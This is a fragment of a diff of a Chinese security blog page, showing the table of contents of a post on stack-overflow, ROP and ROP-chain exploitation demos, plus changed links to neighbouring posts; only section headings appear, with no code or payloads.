class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#问题"><span class="toc-number">4.</span> <span class="toc-text">问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo2-NO-DEP-–Return-Oriented-Programming"><span class="toc-number"></span> <span class="toc-text">Demo2(NO DEP) –Return Oriented Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码-1"><span class="toc-number">1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-1"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#步骤"><span class="toc-number">3.</span> <span class="toc-text">步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode"><span class="toc-number">4.</span> <span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo3-DEP-–ROP-Chain"><span class="toc-number"></span> <span class="toc-text">Demo3(DEP) –ROP Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码-2"><span class="toc-number">1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-2"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#System-Call"><span class="toc-number">3.</span> <span class="toc-text">System Call</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROPgadget-编译出错"><span class="toc-number">5.</span> <span class="toc-text">ROPgadget 编译出错</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -486,13 +514,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/07/09/爬坑之路--BIN(五)--9/" title="上一篇: 爬坑之路--BIN(五)--9">
+            <a href="/2018/10/30/linux-远程连接/" title="上一篇: linux 远程连接">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2018/07/07/爬坑之路--WEB(四)--6/" title="下一篇: 爬坑之路--WEB(四)--6">
+            <a href="/2018/09/19/believeme/" title="下一篇: believeme">
                 <i class="fa fa-angle-right"></i>
             </a>
         
